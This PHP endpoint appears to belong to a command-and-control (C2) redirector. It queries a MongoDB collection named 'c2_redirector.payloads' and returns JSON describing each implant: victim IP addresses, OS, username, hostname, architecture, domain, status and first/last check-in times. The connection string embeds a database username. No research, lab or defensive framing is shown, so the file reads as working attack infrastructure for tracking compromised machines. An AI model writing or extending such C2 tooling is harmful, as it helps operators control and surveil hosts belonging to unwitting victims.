<?php
// payloads_fixed.php - Using MongoDB driver directly
header('Content-Type: application/json');

// Check if MongoDB driver is available
if (!class_exists('MongoDB\Driver\Manager')) {
    http_response_code(500);
    echo json_encode(["error" => "MongoDB Driver not available"]);
    exit;
}

try {
    // Use MongoDB driver directly
    $manager = new MongoDB\Driver\Manager("mongodb+srv://s12deff_db_user:...@cluster0.btqpvis.mongodb.net/?appName=Cluster0");
    
    // Find all payloads sorted by last_seen descending
    $query = new MongoDB\Driver\Query([], ['sort' => ['last_seen' => -1]]);
    $cursor = $manager->executeQuery('c2_redirector.payloads', $query);
    $documents = $cursor->toArray();
    
    $payloadsList = [];
    
    foreach ($documents as $document) {
        $payload = [
            'uuid' => $document->uuid,
            'ips' => $document->ips ?? [],
            'os' => $document->os ?? '',
            'user' => $document->user ?? '',
            'host' => $document->host ?? '',
            'architecture' => $document->architecture ?? '',
            'domain' => $document->domain ?? '',
            'status' => $document->status ?? 'active'
        ];
        
        // Convert BSON dates to ISO format
        if (isset($document->first_seen) && $document->first_seen instanceof MongoDB\BSON\UTCDateTime) {
            $payload['first_seen'] = $document->first_seen->toDateTime()->format('c');
        }
        
        if (isset($document->last_seen) && $document->last_seen instanceof MongoDB\BSON\UTCDateTime) {
            $payload['last_seen'] = $document->last_seen->toDateTime()->format('c');
        }
        
        $payloadsList[] = $payload;
    }
    
    echo json_encode([
        "payloads" => $payloadsList,
        "count" => count($payloadsList)
    ]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(["error" => "Database error: " . $e->getMessage()]);
}
?>